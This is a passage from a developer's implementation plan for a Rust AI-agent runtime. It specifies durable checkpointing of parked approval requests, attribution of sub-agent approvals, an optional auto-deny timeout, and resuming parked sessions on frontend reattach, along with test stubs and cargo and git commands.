            .map(|ck| ck.child(&ctx.call_id, origin.clone()));
        // Wrap-at-dispatch attribution (spec §2.6): every request the child
        // issues is stamped; the sub{n}: sink rewrite never touches approvals.
        let child_approval: Arc<dyn ApprovalChannel> = Arc::new(
            agent_policy::AttributingApprovalChannel::new(self.deps.approval.clone(), origin),
        );
```

and pass `child_approval` (not `self.deps.approval.clone()`) into
`AgentLoop::new(...)`. After the middleware/backend builders
(`let child = child.with_middleware(...)...`):

```rust
        let child = match &child_ckpt {
            Some(ck) => child.with_checkpointer(ck.clone()),
            None => child,
        };
```

Nested deps (locate `nested.id_prefix = format!("sub{n}:");`) also carry the
CHILD's checkpointer so grandchildren nest under it:

```rust
            nested.checkpoint = child_ckpt.clone();
```

**Resume rebinding** — replace the plain child run (locate by content
`let run = child.run_with_cancel(&mut child_ctx, prompt, child_cancel.clone());`)
with a checkpoint-aware entry. **Ordering (plan review finding 9): the
restored-child load must run BEFORE the `child_ctx` construction** (live
source builds `child_ctx` at ~:786, before `EndGuard::new` at ~:819) — place
the load just above `let mut child_ctx = ...` and surface its failure via
the pre-Start validation-error idiom used by the checks above it (no
`guard`/`sink` exist yet at that point):

```rust
        // Resume rebinding (spec §2.5): a parked child restores in place
        // instead of starting fresh. Corrupt ⇒ refuse honestly (spec §4).
        let restored_child: Option<crate::Checkpoint> = match &child_ckpt {
            Some(ck) => {
                let loaded = ck.load_child(&ctx.call_id).and_then(|chk| {
                    if let Some(c) = &chk {
                        crate::checkpoint::verify_tally_floor(c)?;
                    }
                    Ok(chk)
                });
                match loaded {
                    Ok(chk) => chk,
                    Err(e) => {
                        // Refuse honestly (spec §4): never start a fresh
                        // child over a corrupt checkpoint. Pre-Start error
                        // idiom — Subagent Start has not fired yet.
                        return Err(ToolError::Failed {
                            message: format!(
                                "sub-agent checkpoint unreadable; cannot resume: {e}"
                            ),
                            stderr: None,
                        });
                    }
                }
            }
            None => None,
        };
```

(Match the pre-Start validation errors' exact return shape at source — if
they return `Ok(<error ToolOutput>)` rather than `Err(ToolError)`, mirror
that instead; the load-bearing part is refusing BEFORE the child starts and
retaining the tampered dir.)

Build the context either way (locate the `let mut child_ctx = CuratedContext::new(...)`
chain) — restored children rebuild pinned state + artifacts:

```rust
        let mut child_ctx = match (&restored_child, &child_ckpt) {
            (Some(chk), Some(ck)) => {
                if let Ok(dump) = ck.child_artifact_dump(&ctx.call_id) {
                    crate::checkpoint::restore_artifacts(&artifacts, &dump).await;
                }
                CuratedContext::restore(
                    Message::system(system),
                    artifacts.clone(),
                    flag,
                    todos,
                    chk.context.clone(),
                )
                .with_offload_config(OffloadConfig {
                    max_result_bytes: self.deps.max_result_bytes,
                    ..OffloadConfig::default()
                })
            }
            _ => CuratedContext::new(Message::system(system), artifacts.clone(), flag)
                .with_offload_config(OffloadConfig {
                    max_result_bytes: self.deps.max_result_bytes,
                    ..OffloadConfig::default()
                })
                .with_artifact_prefix(format!("sub{n}-"))
                .with_todos(todos),
        };
```

(The restored arm keeps `chk.context.artifact_prefix` — the ORIGINAL
`sub{k}-` prefix — so restored seq/prefix naming stays collision-free; do
not re-apply `sub{n}-`.)

Run entry (replacing the single `let run = ...` line):

```rust
        let child_cancel = ctx.cancel.child_token();
        let run = async {
            match (&restored_child, &child_ckpt) {
                (Some(chk), Some(ck)) => {
                    // A resumed child gets a FRESH dispatch timeout by
                    // construction — ctx.timeout is this (new) call's clock
                    // (spec §2.5 child-deadline row).
                    let decision = ck
                        .load_child_answer(&ctx.call_id);
                    child
                        .resume_with_cancel(&mut child_ctx, chk.resume_turn(decision), child_cancel.clone())
                        .await
                }
                _ => child.run_with_cancel(&mut child_ctx, prompt, child_cancel.clone()).await,
            }
        };
        // P2 (owner 2026-07-10): the deadline covers WORK, not
        // waiting-for-approval. While this child (or any descendant) is
        // blocked at a durable Ask, an expiry does not kill it — the clock
        // re-arms and checks again. Live-only asks (no checkpointer) keep
        // today's hard deadline.
        let mut run = std::pin::pin!(run);
        let timed_out = loop {
            match tokio::time::timeout(ctx.timeout, run.as_mut()).await {
                Ok(r) => break Ok(r),
                Err(elapsed) => {
                    if child_ckpt.as_ref().is_some_and(|ck| ck.is_awaiting_ask()) {
                        continue; // parked at an ask — deadline disarmed
                    }
                    break Err(elapsed);
                }
            }
        };
        match timed_out {
```

`load_child_answer` is a small addition to `Checkpointer`
(`take_answer` against the child dir):

```rust
    pub fn load_child_answer(&self, call_id: &str) -> Option<bool> {
        take_answer(&self.dir.join("children").join(sanitize_dir_key(call_id)), &self.key)
    }
```

After the child completes (locate `guard.finish(SubagentOutcome::Completed, None);`),
clean up:

```rust
        if let Some(ck) = &child_ckpt {
            ck // the CHILD's checkpointer points at the child dir itself;
               // remove the whole child tree now that it finished.
               ;
        }
```

— implement concretely as: `child_ckpt` was created via `parent.child(...)`,
whose `dir` IS the child dir; add `pub fn clear_all(&self)` on
`Checkpointer` (`let _ = std::fs::remove_dir_all(&self.dir);`) and call
`ck.clear_all()` on the Completed path only. What Timeout does to a child
whose ask is STILL parked is **owner decision P2** (header note 7) — under
option (a) the deadline never fires while parked, under option (b) the
timeout path must leave the whole tree parked; implement per the recorded
ruling, and pin it with a test either way.

The `prompt` variable becomes unused on the resume arm — it is moved into
`run` only on the fresh arm; borrow-check will guide (clone if needed,
smallest diff wins).

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-core dispatch && cargo test -p agent-core`
Expected: new tests PASS; full suite PASS (rigs updated with
`checkpoint: None`).

- [ ] **Step 5: Commit**

```bash
git add agent/crates/agent-core/src/dispatch.rs agent/crates/agent-core/src/checkpoint.rs agent/crates/agent-runtime-config/src/assemble.rs
git commit -m "feat(core): child checkpoint tree, wrap-at-dispatch attribution, resume rebinding (4B-1, D3/G4)"
```

---

### Task 10: Server channel — E5 knob, park-friendly pending, wire origin, CLI prefix

**Files:**
- Modify: `agent/crates/agent-server/src/approval.rs`,
  `agent/crates/agent-server/src/session.rs`,
  `agent/crates/agent-server/src/wire.rs`,
  `agent/crates/agent-runtime-config/src/runtime_config.rs` (knob),
  `agent/crates/agent-cli/src/approval.rs` (prompt prefix only)
- Test: inline tests in `approval.rs`, `runtime_config.rs`

**Interfaces:**
- Consumes: Task 2 (`ApprovalOrigin`).
- Produces (Tasks 12–13 rely on):

```rust
// runtime_config.rs — RuntimeConfig gains (PartialRuntimeConfig too):
/// E5 knob: auto-deny an unanswered approval after N seconds (headless/eval
/// callers). None (default) = an unanswered Ask parks indefinitely.
#[serde(default)]
pub approval_auto_deny_secs: Option<u64>,

// wire.rs:
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ApprovalOriginDto {
    pub delegation_id: String,
    pub subagent: String,
    pub depth: usize,
}
// ServerEvent::ApprovalRequest gains:
//   #[serde(default, skip_serializing_if = "Option::is_none")]
//   origin: Option<ApprovalOriginDto>,

// approval.rs:
impl IpcApprovalChannel {
    pub fn new(slot: EventSlot, timeout: Option<Duration>) -> Self;  // was Duration
    /// Re-send every still-pending approval frame to a (re)attached
    /// frontend — the daemon-alive reattach path (spec §2.4 step 5): the
    /// live pending id is reused, no second id minted.
    pub fn reemit_pending(&self, out: &Arc<dyn EventOut>);
    /// Mint a pending entry for an ask that is NOT blocked on a live loop
    /// (restart-path re-emit; Task 12). `group` tags the entry (the parked
    /// session id) so retract_external_for can sweep it. Returns (id, rx).
    pub fn register_external(&self, group: &str, ev_fields: ExternalAsk) -> (String, oneshot::Receiver<ApprovalResponse>);
    /// Drop every still-pending external entry tagged `group` (first answer
    /// won; stale prompts must not mint a second resume — finding 12).
    pub fn retract_external_for(&self, group: &str);
}
pub struct ExternalAsk {
    pub summary: String,
    pub command: Option<String>,
    pub display: Option<Display>,
    pub origin: Option<ApprovalOriginDto>,
}
// struct gains: external_groups: Mutex<HashMap<String /*id*/, String /*group*/>>
// register_external inserts (id → group); retract_external_for removes the
// group's ids from pending, pending_frames, and external_groups (dropping a
// pending oneshot sender makes any in-flight rx.await resolve Err — the
// Task-12 waiter's `let Ok(resp) = rx.await else { return }` absorbs it).
```

- [ ] **Step 1: Write the failing tests**

In `approval.rs` tests (a `Captured` EventOut exists in session.rs tests —
mirror it here):

```rust
    #[tokio::test]
    async fn unanswered_ask_parks_indefinitely_without_knob() {
        // IpcApprovalChannel::new(slot, None); subscriber attached.
        // spawn request(); sleep 50ms; assert the future is still pending
        // (tokio::time::pause + advance far past 300s: no Deny). Then
        // resolve(id, Approve) → future completes Approve.
    }

    #[tokio::test]
    async fn knob_auto_denies_after_n_seconds() {
        // new(slot, Some(Duration::from_secs(2))); tokio::time::pause();
        // spawn request(); advance(3s) → resolves Deny; pending map empty.
    }

    #[tokio::test]
    async fn no_subscriber_no_longer_denies_it_parks() {
        // slot empty; new(slot, None); spawn request() — stays pending
        // (TODAY it returns Deny immediately: this pins the E5 flip).
        // Then set_event_out + reemit_pending → Captured sees the frame
        // with the ORIGINAL id; resolve(id, Approve) completes the request.
    }

    #[tokio::test]
    async fn reemit_covers_daemon_alive_reattach_and_clears_on_resolve() {
        // subscriber A attached; request() emits once. Attach B (new
        // Captured); reemit_pending(B) → B sees the same id. resolve() →
        // reemit_pending(C) sends nothing (frame cleared).
    }

    #[tokio::test]
    async fn origin_rides_the_wire_frame() {
        // request() with req.origin = Some(ApprovalOrigin{ "c7","explore",1 })
        // → Captured's ApprovalRequest frame has origin ==
        //   Some(ApprovalOriginDto{ delegation_id:"c7", subagent:"explore", depth:1 }).
    }
```

In `runtime_config.rs` tests: knob default is None; a config JSON with
`"approval_auto_deny_secs": 30` round-trips (mirror an existing optional-
field test — locate `claude_effort` tests by content).

Dev-dep note (plan review finding 14): the `tokio::time::pause`/`advance`
tests need `tokio = { workspace = true, features = ["test-util"] }` in
agent-server's `[dev-dependencies]` (agent-core already has it; agent-server
does not) — add it in this task.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd agent && cargo test -p agent-server approval`
Expected: COMPILE ERROR / FAIL (`new` arity, no `reemit_pending`,
no-subscriber currently denies).

- [ ] **Step 3: Implement**

`approval.rs`:

```rust
pub struct IpcApprovalChannel {
    slot: EventSlot,
    pending: Mutex<HashMap<String, oneshot::Sender<ApprovalResponse>>>,
    /// Frames for still-pending asks, re-sent on (re)attach so a frontend
    /// that missed the original emit can answer (spec §2.4 step 5).
    pending_frames: Mutex<HashMap<String, ServerEvent>>,
    counter: AtomicU64,
    /// E5: None = park indefinitely; Some = auto-deny after the duration.
    timeout: Option<Duration>,
}
```

`request` body (replacing today's — the frame construction gains `origin`):

```rust
    async fn request(&self, req: ApprovalRequest) -> ApprovalResponse {
        let id = format!("c{}", self.counter.fetch_add(1, Ordering::Relaxed));
        let (otx, orx) = oneshot::channel();
        self.pending.lock().unwrap().insert(id.clone(), otx);
        let ev = ServerEvent::ApprovalRequest {
            id: id.clone(),
            summary: req.intent.summary.clone(),
            command: req.intent.command.clone(),
            display: req.display.clone(),
            origin: req.origin.as_ref().map(|o| crate::wire::ApprovalOriginDto {
                delegation_id: o.delegation_id.clone(),
                subagent: o.subagent_name.clone(),
                depth: o.depth,
            }),
        };
        self.pending_frames.lock().unwrap().insert(id.clone(), ev.clone());
        // No subscriber ⇒ the ask PARKS instead of denying (E5): the frame
        // is re-sent by reemit_pending on the next attach.
        if let Some(out) = self.slot.lock().unwrap().clone() {
            out.send(ev);
        }
        // Drop-safety (plan review finding 3): the caller may be dropped
        // mid-await (e.g. a dispatch deadline cancelling the child future).
        // The guard removes BOTH map entries on any exit — a dropped await
        // must not leave a zombie prompt that re-emits forever.
        struct PendingGuard<'a>(&'a IpcApprovalChannel, String);
        impl Drop for PendingGuard<'_> {
            fn drop(&mut self) {
                self.0.pending.lock().unwrap().remove(&self.1);
                self.0.pending_frames.lock().unwrap().remove(&self.1);
            }
        }
        let _guard = PendingGuard(self, id.clone());
        match self.timeout {
            Some(t) => match tokio::time::timeout(t, orx).await {
                Ok(Ok(resp)) => resp,
                _ => ApprovalResponse::Deny,
            },
            None => orx.await.unwrap_or(ApprovalResponse::Deny),
        }
    }
```

Add a test alongside the others: spawn `request()`, abort the task while it
is pending, then assert `reemit_pending` sends nothing and `resolve` of the
old id is a no-op.

```rust
    pub fn reemit_pending(&self, out: &Arc<dyn EventOut>) {
        for ev in self.pending_frames.lock().unwrap().values() {
            out.send(ev.clone());
        }
    }

    pub fn register_external(&self, ask: ExternalAsk) -> (String, oneshot::Receiver<ApprovalResponse>) {
        let id = format!("c{}", self.counter.fetch_add(1, Ordering::Relaxed));
        let (otx, orx) = oneshot::channel();
        self.pending.lock().unwrap().insert(id.clone(), otx);
        let ev = ServerEvent::ApprovalRequest {
            id: id.clone(),
            summary: ask.summary,
            command: ask.command,
            display: ask.display,
            origin: ask.origin,
        };
        self.pending_frames.lock().unwrap().insert(id.clone(), ev.clone());
        if let Some(out) = self.slot.lock().unwrap().clone() {
            out.send(ev);
        }
        (id, orx)
    }
```

`resolve` also clears the frame (locate the existing `resolve` — add
`self.pending_frames.lock().unwrap().remove(id);`). NOTE `register_external`'s
receiver has no timeout by design (restart-path asks park until answered);
Task 12 owns clearing its entry if the session becomes unresumable.

`session.rs`:
- Delete `const APPROVAL_TIMEOUT`. In `from_params` (the config is loaded
  two lines above the channel construction — REORDER so `config` exists
  first, smallest diff):

```rust
        let config = RuntimeConfig::load_over(params.config.clone(), &params.config_path);
        let approval = Arc::new(IpcApprovalChannel::new(
            slot.clone(),
            config.approval_auto_deny_secs.map(Duration::from_secs),
        ));
```

- `set_event_out` re-emits pending prompts on attach:

```rust
    pub fn set_event_out(&self, out: Arc<dyn EventOut>) {
        *self.slot.lock().unwrap() = Some(out.clone());
        // Daemon-alive reattach (spec §2.4 step 5): pending asks re-emit
        // under their LIVE ids — no duplicate is minted.
        self.approval.reemit_pending(&out);
    }
```

`wire.rs`: add `ApprovalOriginDto` + the `origin` field on the
`ApprovalRequest` variant (as in Interfaces). Additive only — existing
decoders ignore unknown/absent optionals.

`runtime_config.rs`: add the knob to `RuntimeConfig` + `PartialRuntimeConfig`
+ the overlay/normalize plumbing — mirror `claude_effort` exactly (locate
every place `claude_effort` appears and add the sibling line).

`agent-cli/src/approval.rs`: where the prompt text is built from
`AgentEvent::Approval(req)` (locate by content), prefix attribution:

```rust
        let who = match &req.origin {
            Some(o) => format!("[sub-agent {} (depth {})] ", o.subagent_name, o.depth),
            None => String::new(),
        };
```

and prepend `who` to the existing prompt line. CLI timeout behavior is
UNCHANGED in 4B-1 (parks-and-exits is 4B-2, E5).

- [ ] **Step 4: Run tests + existing-suite sweep**

Run: `cd agent && cargo test -p agent-server && cargo test -p agent-runtime-config && cargo build -p agent-cli`
Expected: PASS. Existing agent-server tests that relied on
no-subscriber⇒Deny or the 300s timeout must be UPDATED to the new semantics
(find them: `grep -rn "APPROVAL_TIMEOUT\|approval" agent/crates/agent-server/src --include=*.rs`)
— update assertions, do not weaken them: the no-subscriber test becomes the
parks-then-reemit pin above.

- [ ] **Step 5: Commit**

```bash
git add agent/crates/agent-server agent/crates/agent-runtime-config/src/runtime_config.rs agent/crates/agent-cli/src/approval.rs
git commit -m "feat(server): approval parks by default + E5 auto-deny knob + origin on wire (4B-1)"
```

---

### Task 11: Assemble + RuntimeState wiring — checkpointer reaches the loop

**Files:**
- Modify: `agent/crates/agent-runtime-config/src/assemble.rs`,
  `agent/crates/agent-server/src/runtime.rs`
- Test: inline tests in `runtime.rs` (+ an assemble pin)

**Interfaces:**
- Consumes: Tasks 5, 9 (`Checkpointer`, `DispatchDeps.checkpoint`),
  4B-0 (`load_or_create_secret`, `metadata_root`, `sessions_root`,
  `session_dir`).
- Produces (Task 12 relies on):

```rust
// assemble.rs — LoopParts gains:
    /// Park-point checkpointing (4B-1). None ⇒ no checkpoint I/O ever (E1);
    /// the CLI passes None in 4B-1 (its reopen surface is 4B-2).
    pub checkpoint: Option<Arc<agent_core::Checkpointer>>,

// runtime.rs:
impl RuntimeState {
    /// The session's root checkpointer (None when identity/secret
    /// unavailable). Shared by build_loop and the resume coordinator.
    pub fn checkpointer(&self) -> Option<Arc<agent_core::Checkpointer>>;
    /// Assemble a loop bound to ANOTHER session's workspace + checkpointer
    /// (attach-to-resume, spec §2.4 step 2): current config, fresh
    /// artifacts/todos/flag, shared sink/approval/stats/mcp tools.
    pub fn build_resume_loop(
        &self,
        workspace: &Path,
        checkpoint: Arc<agent_core::Checkpointer>,
        artifacts: &Arc<SessionArtifacts>,
        todos: &agent_core::TodoHandle,
        compact_flag: &Arc<AtomicBool>,
    ) -> BuiltLoop;
}
```

- [ ] **Step 1: Write the failing tests**

In `runtime.rs` tests (reuse `make_with_trace_dir` from 4B-0):

```rust
    // NOTE (plan review finding 14): RuntimeState sources the secret via
    // load_or_create_secret(metadata_root()) — the REAL $HOME. Isolate HOME
    // for these tests the way the repo's other HOME-sensitive tests do (or
    // introduce that pattern here: serial_test dev-dep + scoped
    // std::env::set_var("HOME", tempdir)); never write the real
    // ~/.rusty-agent/secret from a test.
    #[test]
    fn runtime_owns_a_checkpointer_rooted_in_the_session_dir() {
        let (rs, _ws, sessions) = make_with_trace_dir();
        let ck = rs.checkpointer().expect("checkpointer built");
        let expect = agent_runtime_config::session_dir(sessions.path(), rs.session_id())
            .join("checkpoint");
        assert_eq!(ck.dir(), expect.as_path());
        // E1: construction creates NOTHING on disk
        assert!(!expect.exists());
    }

    #[test]
    fn build_resume_loop_binds_descriptor_workspace_and_checkpointer() {
        let (rs, _ws, sessions) = make_with_trace_dir();
        let other_ws = tempfile::tempdir().unwrap();
        let ck = agent_core::Checkpointer::new(
            sessions.path().join("old-1").join("checkpoint"), [1u8; 32], "old-1".into());
        let artifacts = Arc::new(SessionArtifacts::new());
        let todos: agent_core::TodoHandle = Arc::new(Mutex::new(Vec::new()));
        let flag = Arc::new(AtomicBool::new(false));
        let built = rs.build_resume_loop(other_ws.path(), ck, &artifacts, &todos, &flag);
        // system prompt composed from CURRENT config (live truth):
        assert_eq!(built.system_prompt, rs.current_system_prompt());
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd agent && cargo test -p agent-server checkpointer`
Expected: COMPILE ERROR — methods not found.

- [ ] **Step 3: Implement**

`assemble.rs`: add the `checkpoint` field to `LoopParts`; in `assemble_loop`,
after the `AgentLoop` is built (locate `AgentLoop::new(` and its builder
chain), thread it into BOTH the loop and dispatch deps:

- loop: `let agent = match &parts.checkpoint { Some(ck) => agent.with_checkpointer(ck.clone()), None => agent };`
- `DispatchDeps { ... }` construction: `checkpoint: parts.checkpoint.clone(),`

Fix all `LoopParts { ... }` construction sites
(`grep -rn "LoopParts {" agent/crates --include=*.rs`): agent-server
`build_loop`, agent-cli `main.rs`, assemble tests — `checkpoint: None`
everywhere except the server (next).

`runtime.rs`:

```rust
    // struct field (near `session_id`):
    /// The session's root park-point checkpointer (4B-1). Built once with
    /// the durable id + daemon-local secret; None when HOME/secret is
    /// unavailable (checkpointing degrades to live-only approvals).
    checkpointer: Option<Arc<agent_core::Checkpointer>>,
```

In `RuntimeState::new`, after the descriptor write / before `build_loop`:

```rust
        let checkpointer = agent_runtime_config::sessions_root(&config).and_then(|root| {
            let meta = agent_runtime_config::metadata_root()?;
            match agent_runtime_config::load_or_create_secret(&meta) {
                Ok(key) => Some(agent_core::Checkpointer::new(
                    agent_runtime_config::session_dir(&root, &session_id).join("checkpoint"),
                    key,
                    session_id.clone(),
                )),
                Err(e) => {
                    tracing::warn!(target: "session", error = %e,
                        "no daemon secret; approvals will not be durable");
                    None
                }
            }
        });
```

`build_loop` gains a `checkpoint: &Option<Arc<agent_core::Checkpointer>>`
parameter passed to `LoopParts { checkpoint: checkpoint.clone(), ... }`;
both call sites (`new`, `apply`) pass `&checkpointer` /
`&self.checkpointer`. Add the accessor + `build_resume_loop`:

```rust
    pub fn checkpointer(&self) -> Option<Arc<agent_core::Checkpointer>> {
        self.checkpointer.clone()
    }

    pub fn build_resume_loop(
        &self,
        workspace: &Path,
        checkpoint: Arc<agent_core::Checkpointer>,
        artifacts: &Arc<SessionArtifacts>,
        todos: &agent_core::TodoHandle,
        compact_flag: &Arc<AtomicBool>,
    ) -> BuiltLoop {
        let cfg = self.config.lock().unwrap().clone();
        build_loop(
            &cfg,
            &self.sink,
            &self.approval,
            workspace,
            &self.api_key,
            &self.claude_binary,
            &self.mcp_tools,
            &self.base_system_prompt,
            artifacts,
            compact_flag,
            todos,
            &self.stats,
            &self.trace,
            &Some(checkpoint),
        )
    }
```

(If `build_loop`'s `workspace` param is `&Path` already this drops in; match
the real arity from Task-11 edits.)

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-server && cargo test -p agent-runtime-config && cargo build --workspace`
Expected: PASS / clean build.

- [ ] **Step 5: Commit**

```bash
git add agent/crates/agent-runtime-config agent/crates/agent-server agent/crates/agent-cli/src/main.rs
git commit -m "feat(runtime): wire session checkpointer through LoopParts into loop + dispatch (4B-1)"
```

(Staging is crate-wide for agent-runtime-config on purpose — the five
`LoopParts` construction sites in `agent-runtime-config/tests/*.rs` gain
`checkpoint: None` too; plan review finding 15.)

---

### Task 12: Attach-to-resume coordinator (agent-server)

**Files:**
- Create: `agent/crates/agent-server/src/resume.rs`
- Modify: `agent/crates/agent-server/src/lib.rs` (`mod resume;`),
  `agent/crates/agent-server/src/session.rs` (attach hook + resume state)
- Test: inline tests in `resume.rs` + one session-level test

**Interfaces:**
- Consumes: Tasks 4–5, 8, 10–11; 4B-0 `scan_descriptors`,
  `load_or_create_secret`.
- Produces: on every frontend attach, parked runs of PRIOR sessions re-emit
  their asks with attribution and re-derived display; the first answer
  durably commits (`answer.json`) and the tree resumes in place.

**Flow** (spec §2.4, header note 3):

1. `scan_parked(sessions_root, key, own_session_id) -> Vec<ParkedSession>`:
   for each descriptor from `scan_descriptors` (skipping the daemon's OWN
   session — its parks are live and covered by `reemit_pending`), walk
   `<dir>/checkpoint` recursively (`children/*`), `load_checkpoint` each
   level. Gate-kind parks (`parked_index: Some`) become `ParkedAsk`s;
   corrupt levels become `ParkedError`s (surfaced, never resumed over).
2. On attach: for each `ParkedAsk` WITHOUT an `answer.json`: re-derive the
   display through a freshly assembled registry (`tool.intent(stored args)`
   — spec §2.4 step 4; the persisted text is never shown), then
   `register_external` + spawn an answer-waiter. For asks WITH an answer
   (crash after commit, before consume): trigger resume directly, no prompt.
3. First answer for a session: `write_answer` into that ask's checkpoint
   dir, then `resume_session` (guarded once per session id). Later answers
   for the same session: their parks were either consumed or will re-ask
   live from the resumed tree — the waiter simply drops.
4. `resume_session`: fresh `SessionArtifacts`/todos/flag; restore artifacts
   + `CuratedContext::restore` from the ROOT checkpoint (`verify_tally_floor`
   first); `build_resume_loop` against the descriptor's workspace;
   `loop.resume_with_cancel(ctx, root_chk.resume_turn(root_answer), token)`.
   Children rebind themselves from disk (Task 9). Stale workspace ⇒ refuse
   with the path named (spec §4). The session's `active` slot guards
   concurrency: a live run makes resume wait its turn — surface a
   `ServerEvent::Error` naming the conflict instead of queueing (busy rule
   A1 applies to resumes too).

- [ ] **Step 1: Write the failing tests**

In `resume.rs` tests:

```rust
    #[tokio::test]
    async fn scan_finds_gate_parks_in_the_child_tree_and_skips_own_session() {
        // tempdir sessions root; two descriptors written via
        // agent_runtime_config::write_descriptor: "100-aaaaaaaa" (own) and
        // "200-bbbbbbbb" (other). Under other's checkpoint dir write:
        //   root: dispatch-kind checkpoint (parked_index None)
        //   children/call_1: gate-kind (parked_index Some(0), origin set)
        //   children/call_2: gate-kind too (SECOND parked child — spec §6
        //   "multiple children parked at once, all re-emitted")
        // Own session also gets a gate park — must be SKIPPED.
        let parked = scan_parked(root.path(), &key(), "100-aaaaaaaa");
        assert_eq!(parked.len(), 1);
        assert_eq!(parked[0].descriptor.session_id, "200-bbbbbbbb");
        assert_eq!(parked[0].asks.len(), 2, "dispatch-kind root is not an ask; both children are");
        let mut paths: Vec<_> = parked[0].asks.iter()
            .map(|a| a.subagent_path.clone()).collect();
        paths.sort();
        assert_eq!(paths, vec![vec!["call_1".to_string()], vec!["call_2".to_string()]]);
        assert!(parked[0].asks.iter().all(|a| a.origin.is_some()));
    }

    #[tokio::test]
    async fn corrupt_level_reports_error_and_never_resumes() {
        // tamper the child's parked.json → scan yields errors, zero asks;
        // the error text names the session.
    }

    #[tokio::test]
    async fn answer_commit_is_durable_and_consumed_once() {
        // gate park on disk; commit_answer(&ask, true, &key()) writes a
        // verified answer.json (checkpoint::take_answer returns Some(true)
        // exactly once).
    }
```

Session-level test in `session.rs`:

```rust
    #[tokio::test]
    async fn attach_reemits_parked_ask_with_rederived_display() {
        // params with trace_dir tempdir (4B-0 pattern). BEFORE constructing
        // the session, plant a PRIOR session on disk: descriptor
        // "100-aaaaaaaa" + gate-kind park whose parked call is
        // execute_command {"command":"echo real"} and whose checkpoint was
        // written with the SECRET the session will use — write it via
        // load_or_create_secret against the metadata root the session
        // derives (see Step 3 note on key sourcing for tests).
        // Construct Session::from_params → set_event_out(Captured).
        // Await briefly; Captured must contain an ApprovalRequest whose
        // summary/command EQUAL tool.intent(planted args)'s output for
        // "echo real" (the checkpoint stores no display text at all — note
        // 2 — so deriving from args is the only possible source; assert the
        // equality to pin §3.4) and whose origin carries the checkpointed
        // attribution.
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd agent && cargo test -p agent-server resume`
Expected: COMPILE ERROR — module absent.

- [ ] **Step 3: Implement `resume.rs`**

```rust
//! Attach-to-resume (spec §2.4): index parked runs from disk, re-emit their
//! asks with re-derived displays, commit answers durably, resume the tree.
use agent_core::checkpoint::{self, Checkpoint};
use agent_runtime_config::SessionDescriptor;
use std::path::{Path, PathBuf};

pub struct ParkedAsk {
    pub dir: PathBuf,                 // this ask's checkpoint dir level
    pub subagent_path: Vec<String>,
    pub checkpoint: Checkpoint,       // verified
    pub origin: Option<agent_policy::ApprovalOrigin>,
    pub answered: bool,               // answer.json already committed
}

pub struct ParkedSession {
    pub descriptor: SessionDescriptor,
    pub root_dir: PathBuf,            // <session dir>/checkpoint
    pub root: Option<Checkpoint>,     // None ⇒ root not parked (child-only… 
                                      // cannot happen: ancestors flush) —
                                      // treat None as corrupt
    pub asks: Vec<ParkedAsk>,
    pub errors: Vec<String>,
}

pub fn scan_parked(root: &Path, key: &[u8; 32], own_session_id: &str) -> Vec<ParkedSession> {
    let mut out = Vec::new();
    for d in agent_runtime_config::scan_descriptors(root) {
        if d.session_id == own_session_id {
            continue; // live session: pending_frames covers its asks
        }
        let ck_dir = agent_runtime_config::session_dir(root, &d.session_id).join("checkpoint");
        if !checkpoint::has_park(&ck_dir) {
            continue;
        }
        let mut s = ParkedSession {
            descriptor: d,
            root_dir: ck_dir.clone(),
            root: None,
            asks: Vec::new(),
            errors: Vec::new(),
        };
        walk(&ck_dir, key, &mut s);
        out.push(s);
    }
    out
}

fn walk(dir: &Path, key: &[u8; 32], s: &mut ParkedSession) {
    match checkpoint::load_checkpoint(dir, key) {
        Ok(Some(chk)) => {
            if let Err(e) = checkpoint::verify_tally_floor(&chk) {
                s.errors.push(format!("{}: {e}", dir.display()));
                return;
            }
            if dir == s.root_dir {
                s.root = Some(chk.clone());
            }
            if chk.parked.parked_index.is_some() {
                s.asks.push(ParkedAsk {
                    dir: dir.to_path_buf(),
                    subagent_path: chk.subagent_path.clone(),
                    origin: chk.parked.origin.clone(),
                    answered: dir.join("answer.json").exists(),
                    checkpoint: chk,
                });
            }
        }
        Ok(None) => {}
        Err(e) => s.errors.push(format!("{}: {e}", dir.display())),
    }
    if let Ok(entries) = std::fs::read_dir(dir.join("children")) {
        for e in entries.flatten() {
            if e.path().is_dir() {
                walk(&e.path(), key, s);
            }
        }
    }
}

pub fn commit_answer(ask: &ParkedAsk, approve: bool, key: &[u8; 32]) -> std::io::Result<()> {
    checkpoint::write_answer(&ask.dir, key, approve)
}
```

- [ ] **Step 4: Session attach hook + resume driver**

`session.rs` — `Session` gains:

```rust
    /// Session ids whose parked tree already has a resume in flight or done
    /// this daemon lifetime (first answer wins; spec §2.4).
    resuming: Arc<Mutex<std::collections::HashSet<String>>>,
```

(`resuming: Arc::new(Mutex::new(Default::default()))` in `from_params`.)
Extend `set_event_out`:

```rust
    pub fn set_event_out(self: &Arc<Self>, out: Arc<dyn EventOut>) {
        *self.slot.lock().unwrap() = Some(out.clone());
        self.approval.reemit_pending(&out);
        self.spawn_parked_reemit();
    }
```

(NOTE: the receiver changes to `self: &Arc<Self>` — update the two callers:
src-tauri `subscribe` already holds an `Arc<Session>`; session.rs tests call
it on an `Arc` too. Verify with `grep -rn "set_event_out" agent src-tauri`.)

```rust
    /// Re-emit every parked ask from PRIOR sessions (spec §2.4 steps 1–5).
    fn spawn_parked_reemit(self: &Arc<Self>) {
        let sess = self.clone();
        tokio::spawn(async move {
            let cfg = sess.runtime.settings_state().settings;
            let Some(root) = agent_runtime_config::sessions_root(&cfg) else { return };
            let Some(meta) = agent_runtime_config::metadata_root() else { return };
            let Ok(key) = agent_runtime_config::load_or_create_secret(&meta) else { return };
            for parked in crate::resume::scan_parked(&root, &key, sess.runtime.session_id()) {
                for err in &parked.errors {
                    sess.emit_error(format!(
                        "session {}: checkpoint unreadable; run cannot be resumed ({err})",
                        parked.descriptor.session_id
                    ));
                }
                if !parked.errors.is_empty() { continue; }
                if !parked.descriptor.workspace.is_dir() {
                    sess.emit_error(format!(
                        "session {} is parked but its workspace {} is missing; cannot resume",
                        parked.descriptor.session_id,
                        parked.descriptor.workspace.display()
                    ));
                    continue;
                }
                sess.clone().wire_parked_session(parked, key);
            }
        });
    }
```

(`emit_error` = tiny helper sending `ServerEvent::Error { message }` via the
slot — add it; check wire.rs for the exact Error variant shape by content.)

